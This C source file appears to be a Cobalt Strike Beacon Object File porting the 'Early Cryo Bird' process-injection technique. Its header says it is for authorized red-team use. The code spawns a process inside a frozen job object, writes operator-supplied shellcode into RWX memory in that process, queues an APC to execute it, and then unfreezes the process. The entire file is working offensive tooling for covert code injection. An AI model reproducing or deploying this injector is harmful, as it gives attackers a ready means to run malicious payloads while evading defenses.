/*
 * Ported from: hhttps://github.com/zero2504/Early-Cryo-Bird-Injections/tree/main
 * Original copyright (c) 2025 Zero2504 — MIT License
 * Port and modifications copyright (c) 2025 Seraphimprotocol — MIT License
 *
 * SPDX-License-Identifier: MIT
 *
 * Intended use: authorized red-team / penetration testing / educational use only.
 */

#include <windows.h>
#include <winternl.h>
#include "beacon.h"

#define JobObjectFreezeInformation 18
#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)

typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemoryEx)(HANDLE, PVOID*, PSIZE_T, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtAssignProcessToJobObject)(HANDLE, HANDLE);
typedef NTSTATUS(NTAPI* pNtCreateJobObject)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES);
typedef NTSTATUS(NTAPI* pNtClose)(HANDLE);

DECLSPEC_IMPORT WINBASEAPI void * __cdecl MSVCRT$memset(void *_Dst,int _Val,size_t _Size);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$InitializeProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$UpdateProcThreadAttribute(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, SIZE_T lpReturnSize);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$DeleteProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI INT WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();

// JOBOBJECT_FREEZE_INFORMATION
typedef struct _JOBOBJECT_WAKE_FILTER {
    ULONG HighEdgeFilter;
    ULONG LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;

typedef struct _JOBOBJECT_FREEZE_INFORMATION {
    union {
        ULONG Flags;
        struct {
            ULONG FreezeOperation : 1;
            ULONG FilterOperation : 1;
            ULONG SwapOperation : 1;
            ULONG Reserved : 29;
        };
    };
    BOOLEAN Freeze;
    BOOLEAN Swap;
    UCHAR Reserved0[2];
    JOBOBJECT_WAKE_FILTER WakeFilter;
} JOBOBJECT_FREEZE_INFORMATION, * PJOBOBJECT_FREEZE_INFORMATION;

void go(char * args, int len) {
  datap parser;
  char * peName;
  unsigned char * shellcode;
  SIZE_T shellcode_len;

  wchar_t w_peName[260];

  BeaconDataParse(&parser, args, len);
  peName = BeaconDataExtract(&parser, NULL);
  shellcode_len = BeaconDataLength(&parser);
  shellcode = BeaconDataExtract(&parser, NULL);

  KERNEL32$MultiByteToWideChar(CP_ACP, 0, peName, -1, w_peName, 128);

  HANDLE hJob = NULL;

  HMODULE hNtDll = GetModuleHandleA("ntdll.dll");

  pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtDll, "NtQueueApcThread");
  pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
  pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)GetProcAddress(hNtDll, "NtAllocateVirtualMemoryEx");
  pNtSetInformationJobObject NtSetInformationJobObject = (pNtSetInformationJobObject)GetProcAddress(hNtDll, "NtSetInformationJobObject");
  pNtAssignProcessToJobObject NtAssignProcessToJobObject = (pNtAssignProcessToJobObject)GetProcAddress(hNtDll, "NtAssignProcessToJobObject");
  pNtCreateJobObject NtCreateJobObject = (pNtCreateJobObject)GetProcAddress(hNtDll, "NtCreateJobObject");
  pNtClose NtClose = (pNtClose)GetProcAddress(hNtDll, "NtClose");

  NTSTATUS creationJob = NtCreateJobObject(&hJob, STANDARD_RIGHTS_ALL | 63, NULL);
  if (!NT_SUCCESS(creationJob)) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Error: 0x%X", creationJob);
    NtClose(hJob);
    return;
  }

  JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
  freezeInfo.FreezeOperation = 1; // Initiate freeze
  freezeInfo.Freeze = TRUE;

  NTSTATUS freezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
  if (!NT_SUCCESS(freezeStatus)) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Error: 0x%X", freezeStatus);
    NtClose(hJob);
    return;
  }

  STARTUPINFOEXW siEx = { 0 };
  intZeroMemory(&siEx, sizeof(siEx));
  siEx.StartupInfo.cb = sizeof(siEx);

  SIZE_T attrListSize = 0;

  KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
  siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attrListSize);
  if (!siEx.lpAttributeList) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Error in the attribute list allocation.");
    NtClose(hJob);
    return;
  }

  if (!KERNEL32$InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attrListSize)) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Error initializing the attribute list: 0x%lu", KERNEL32$GetLastError());
    NtClose(hJob);
    return;
  }

  if(!KERNEL32$UpdateProcThreadAttribute(siEx.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_JOB_LIST, &hJob, sizeof(HANDLE), NULL, 0)) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Error updating the attribute list: 0x%lu", KERNEL32$GetLastError());
    KERNEL32$DeleteProcThreadAttributeList(siEx.lpAttributeList);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, siEx.lpAttributeList);
    return;
  }

  PROCESS_INFORMATION pi = { 0 };
  intZeroMemory(&pi, sizeof(pi));

  if (!KERNEL32$CreateProcessW(w_peName, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) {
    BeaconPrintf(CALLBACK_ERROR, "[!] CreateProcessW Failed: 0x%lu", KERNEL32$GetLastError());
    KERNEL32$DeleteProcThreadAttributeList(siEx.lpAttributeList);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, siEx.lpAttributeList);
    NtClose(hJob);
    return;
  }

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Process start in Job! PID: %d", pi.dwProcessId);

  KERNEL32$DeleteProcThreadAttributeList(siEx.lpAttributeList);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, siEx.lpAttributeList);

  PVOID remoteMemory = NULL;

  NTSTATUS allocStatus = NtAllocateVirtualMemoryEx(pi.hProcess, &remoteMemory, &shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, NULL, 0);
  if (NT_SUCCESS(allocStatus)) {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] NtAllocateVirtualMemoryEx allocated memory at 0x%p", remoteMemory);
  }
  else {
    BeaconPrintf(CALLBACK_ERROR, "[!] Error: 0x%X", allocStatus);
    NtClose(hJob);
    NtClose(pi.hThread);
    NtClose(pi.hProcess);
    return;
  }

  NTSTATUS writeStatus = NtWriteVirtualMemory(pi.hProcess, remoteMemory, (PVOID)shellcode, (SIZE_T)shellcode_len, NULL);
  if (NT_SUCCESS(writeStatus)) {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode was written to 0x%p", remoteMemory);
  }
  else {
    BeaconPrintf(CALLBACK_ERROR, "[!] Error: 0x%X", writeStatus);
    NtClose(hJob);
    NtClose(pi.hThread);
    NtClose(pi.hProcess);
    return;
  }

  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteMemory;
  NTSTATUS statusAPC = NtQueueApcThread(pi.hThread, (PVOID)apcRoutine, NULL, NULL, NULL);

  if (!NT_SUCCESS(statusAPC)) {
  BeaconPrintf(CALLBACK_ERROR, "[!] NtQueueApcThread Failed With Error : 0x%X", statusAPC);
	return;
  }
  else {
	BeaconPrintf(CALLBACK_OUTPUT, "[+] NtQueueApcThread successfully queued APC");
  }

  freezeInfo.FreezeOperation = 1; // Unfreeze operation
  freezeInfo.Freeze = FALSE;

  NTSTATUS unfreezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
  if (!NT_SUCCESS(unfreezeStatus)) {
	BeaconPrintf(CALLBACK_ERROR, "[!] Error: 0x%X", unfreezeStatus);
	NtClose(hJob);
	return;
  }

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Process thawed successfully!");

  NtClose(hJob);
  NtClose(pi.hThread);
  NtClose(pi.hProcess);

  return;
}
